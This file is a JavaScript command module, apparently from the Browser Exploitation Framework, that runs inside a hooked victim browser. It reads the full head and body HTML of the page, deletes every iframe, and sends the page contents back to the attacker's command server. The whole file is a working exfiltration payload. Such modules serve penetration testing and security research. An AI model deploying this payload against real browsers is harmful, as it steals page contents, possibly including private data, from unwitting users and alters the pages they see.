//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	try {
		var html_head = document.head.innerHTML.toString();
	} catch (e) {
		var html_head = "Error: document has no head";
	}
	try {
		var html_body = document.body.innerHTML.toString();
	} catch (e) {
		var html_body = "Error: document has no body";
	}
        try {
		var iframes = document.getElementsByTagName('iframe');
		var iframe_count = iframes.length;
		for(var i=0; i<iframe_count; i++){
			server.net.send("<%= @command_url %>", <%= @command_id %>, 'iframe_result=iframe'+i+'_found');
			iframes[i].parentNode.removeChild(iframes[i]);
			server.net.send("<%= @command_url %>", <%= @command_id %>, 'iframe_result=iframe'+i+'_removed');
		}
		var iframe_ = "Info: "+ iframe_count +" iframe(s) processed";
	} catch (e) {
		var iframe_ = "Error: can not remove iframe";
	}

	server.net.send("<%= @command_url %>", <%= @command_id %>, 'head='+html_head+'&body='+html_body+'&iframe_='+iframe_);

});

